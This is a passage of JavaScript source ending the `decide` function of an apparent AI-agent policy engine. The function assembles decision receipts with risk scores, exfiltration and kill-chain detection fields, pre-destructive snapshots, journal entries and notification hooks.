  if (promotionGuidance.stage !== "new" && promotionGuidance.stage !== "promoted") {
    explanationParts.push(`promotion=${promotionGuidance.stage}`);
  }
  if (source.startsWith("contract-allow") && contractId)  explanationParts.push(`contract=${contractId}`);
  if (source.startsWith("contract-allow") && contractReason) explanationParts.push(`scope=${contractReason}`);

  const lifecycleSummary = promotionState
    ? [
        promotionState.createdAt ? `created=${promotionState.createdAt}` : null,
        promotionState.eligibleAt ? `eligible=${promotionState.eligibleAt}` : null,
        promotionState.acceptedAt ? `accepted=${promotionState.acceptedAt}` : null,
        promotionState.dismissedAt ? `dismissed=${promotionState.dismissedAt}` : null,
        promotionState.lastApprovedAt ? `last-approved=${promotionState.lastApprovedAt}` : null,
      ].filter(Boolean).join(" | ")
    : null;

  const workflowRoute = recommend(action, enriched, risk, discovered);

  // ADR-013: snapshot fires AFTER all floors decide AND BEFORE the
  // engine returns `allow`, gated on `ir.destructive === true`. Failure
  // marks the receipt `failed-fail-open` and proceeds — never promotes to
  // block, never weakens a stronger action.
  let _snapshotReceipt = null;
  if (process.env.LILARA_AUTO_SNAPSHOT !== "0" && action === "allow" && input.ir && input.ir.destructive === true) {
    try {
      const _sScope = _snapshot.planSnapshotScope(input.ir, { reason: input.ir.commandClass || "destructive" });
      const _sR = _snapshot.createSnapshot(_sScope, null, { decisionKey: policyKey, irHash: input.ir.irHash || null });
      _snapshotReceipt = { attempted: true, status: _sR.status, snapshotId: _sR.snapshotId || null,
        paths: _sR.manifest ? _sR.manifest.fileCount : 0, bytes: _sR.bytes || 0, reason: _sR.reason || null };
    } catch (err) {
      _snapshotReceipt = { attempted: true, status: "failed-fail-open", snapshotId: null,
        paths: 0, bytes: 0, reason: err && err.message ? String(err.message) : "snapshot-error" };
    }
  }

  const _decidedCode = floorFired ? floorCodeFor(floorFired) : null;
  const result = {
    action,
    enforcementAction: ["block", "escalate", "require-review", "require-tests"].includes(action) ? "block" : "warn",
    floorFired: floorFired || null,
    ...(_decidedCode ? { code: _decidedCode } : {}),
    riskScore: risk.score,
    riskLevel: risk.level,
    reasonCodes: risk.reasons,
    confidence: source === _LA.source
      ? 0.92
      : risk.level === "low"
        ? 0.9
        : risk.level === "medium"
          ? 0.75
          : risk.level === "high"
            ? 0.55
            : 0.95,
    decisionSource: source,
    policyKey,
    explanation: explanationParts.join(" | "),
    pendingSuggestion: pendingSuggestion?.status === "pending" ? pendingSuggestion.key : null,
    promotionGuidance,
    promotionState,
    promotionLifecycleSummary: lifecycleSummary,
    workflowRoute,
    actionPlan,
    trajectoryNudge,
    envelope: input.envelope || null,
    envelopeVerification,
    intent: intentResult.intent,
    context: risk.context,
    ...(validityWarning ? { validityWarning } : {}),
    ...(mcpWarning            ? { mcpWarning }            : {}),
    ...(skillWarning          ? { skillWarning }          : {}),
    ...(sessionDurationWarning ? { sessionDurationWarning } : {}),
    // mcp-tool-drift: rug-pull advisory field. Present only when arg-shape
    // drift was detected for this MCP tool call. Flag-only — action unchanged.
    ...(_mcpToolDrift ? { mcpToolDrift: _mcpToolDrift } : {}),
    // ADR-009 PR-C: receipt enrichment on every ambient-touch decision.
    ...(_ambientTouch.class ? { ambientClass: _ambientTouch.class } : {}),
    ...(_ambientTouch.path  ? { ambientPath:  _ambientTouch.path  } : {}),
    // ADR-004 PR 37B: degraded-mode marker on every decision while the
    // chain has failed verify. Absent on healthy chains so existing
    // receipts stay byte-identical.
    ...(_degradedReceiptMarker ? { degradedMode: _degradedReceiptMarker } : {}),
    // F19 (ADR-010): output-channel exfiltration detail. Present only when
    // F19 fired (confirmed early-blocks are handled in buildEarlyBlock).
    ...(_f19Detail ? {
      outputChannel: _f19Detail.outputChannel || null,
      matchClasses: Array.isArray(_f19Detail.matchClasses) ? _f19Detail.matchClasses : [],
      redactedSample: typeof _f19Detail.redactedSample === "string" ? _f19Detail.redactedSample : "",
      compensatingRestrictionApplied: Boolean(_f19Detail.compensatingRestrictionApplied),
    } : {}),
    // F20 (ADR-012): change-intent drift receipt key. Emitted on every F20
    // evaluation (drift or not); absent only when an earlier floor short-
    // circuited via buildEarlyBlock OR the F20 try-block itself threw.
    ...(_changeIntent ? { changeIntent: _changeIntent } : {}),
    // ADR-013: additive snapshot receipt key on destructive-allow only.
    ...(_snapshotReceipt ? { snapshot: _snapshotReceipt } : {}),
    // ADR-017 F23: kill-chain observability field. Present when a chain was
    // detected (observe or enforce mode). Absent on clean calls so existing
    // receipts stay byte-identical.
    ...(_f23Detail ? { killChain: _f23Detail } : {}),
  };

  const irExtras = _irJournalExtras(input, floorFired);
  if (!_dryRun) {
    append({
      kind: "runtime-decision",
      action: result.action,
      riskLevel: result.riskLevel,
      riskScore: result.riskScore,
      reasonCodes: result.reasonCodes,
      tool: input.tool || "",
      intent: intentResult.intent,
      branch: input.branch || "",
      targetPath: input.targetPath || "",
      notes: `${source}${input.notes ? ` | ${input.notes}` : ""}`,
      ...(contractId ? { contractId, contractRevision: contract?.revision } : {}),
      ...(source === _CA.source[0] ? { scopeHit: contractReason } : {}),
      ...(floorFired ? { floorFired } : {}),
      ...(_decidedCode ? { code: _decidedCode } : {}),
      ...(taintResult?.tainted ? { taintSource: taintResult.source, taintReason: taintResult.reason } : {}),
      ...(validityWarning ? { validityWarning } : {}),
      ...(mcpWarning            ? { mcpWarning }            : {}),
      ...(skillWarning          ? { skillWarning }          : {}),
      ...(sessionDurationWarning ? { sessionDurationWarning } : {}),
      ...(_mcpToolDrift ? { mcpToolDrift: _mcpToolDrift } : {}),
      ...(_ambientTouch.class ? { ambientClass: _ambientTouch.class } : {}),
      ...(_ambientTouch.path  ? { ambientPath:  _ambientTouch.path  } : {}),
      ...(_degradedReceiptMarker ? { degradedMode: _degradedReceiptMarker } : {}),
      ...(_f19Detail ? { f19Detail: _f19Detail } : {}),
      ...(_changeIntent ? { changeIntent: _changeIntent } : {}),
      // ADR-013: additive snapshot receipt key passes through the journal
      // entry verbatim. Absent on non-destructive / non-allow decisions so
      // existing journals stay byte-identical.
      ...(_snapshotReceipt ? { snapshot: _snapshotReceipt } : {}),
      // ADR-017 F23: kill-chain receipt field in journal (same presence rule as result).
      ...(_f23Detail ? { killChain: _f23Detail } : {}),
      ...(irExtras || {}),
      redact: Boolean(contract?.scopes?.secrets?.redactInJournal),
    });
  }

  if (!_dryRun) {
    recordDecision({
      action: result.action,
      riskLevel: result.riskLevel,
      reasonCodes: result.reasonCodes,
    });
  }

  // Increment destructive-op counter after an allowed destructive-delete — F14 checks at next decide().
  try {
    if (action === "allow" && cmdClass === "destructive-delete" && _recordDestructiveOp) {
      _recordDestructiveOp({ sessionId: enriched.sessionId || discovered.sessionId });
    }
  } catch { /* session-budget unavailable → no-op */ }

  // ADR-015 PR-η: notification hook. Fire-and-forget — invoked AFTER receipt
  // assembly + journal append, BEFORE return. NEVER awaited; NEVER changes
  // the decision; sets `result.notifyAttempted = true` only when an event
  // matched and the transport call was kicked off.
  _fireNotifyHook(result, contract, policyKey);

  return result;
}

module.exports = { decide };
